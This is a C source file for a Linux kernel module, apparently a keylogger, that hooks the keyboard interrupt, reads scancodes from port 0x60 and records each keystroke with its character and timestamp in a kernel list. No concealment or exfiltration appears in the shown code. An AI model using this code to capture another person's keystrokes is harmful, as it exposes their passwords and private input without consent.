#include "keylog.h"

extern struct s_keyboard_map keyboard_mapping[];
extern struct list_head head_stroke_lst;

bool shift = -1;
bool caps_lock = -1;
DEFINE_SPINLOCK(scan_lock);

static void fill_stroke(struct s_stroke *new, struct s_keyboard_map *entry,
			struct timespec ts, unsigned char scancode)

{
	new->key =  scancode & 0x7f;
	entry = &keyboard_mapping[new->key];
	new->name =  entry->str;
	new->state = (scancode & 0x80) ? RELEASED : PRESSED;
	entry->pressed = new->state == PRESSED ? true : false;
	if (entry->pressed)
		entry->nb_pressed += 1;
	else
		entry->nb_released += 1;
	caps_lock = entry->pressed && new->key == CAPS_LOCK ? !caps_lock : caps_lock;
	shift = keyboard_mapping[SHIFT_R].pressed | keyboard_mapping[SHIFT_L].pressed;
	if (isalpha(entry->ascii))
		new->value = shift == caps_lock ? entry->ascii : entry->shift_ascii;
	else
		new->value = shift ? entry->shift_ascii : entry->ascii;
	time_to_tm(ts.tv_sec, sys_tz.tz_minuteswest, &new->time);
	list_add(&new->stroke_lst, &head_stroke_lst);
}

irqreturn_t keyboard_handler (int irq, void *dev_id)
{
	struct s_stroke		*new;
	struct timespec ts;
	struct s_keyboard_map	*entry;
	static unsigned char scancode;

	getnstimeofday(&ts);
	spin_lock(&scan_lock);
	scancode = inb(0x60);
	spin_unlock(&scan_lock);
	new = kmalloc(sizeof(*new), GFP_ATOMIC);
	if (new)
		fill_stroke(new, entry, ts, scancode);
	return IRQ_HANDLED;
}
EXPORT_SYMBOL(keyboard_handler);
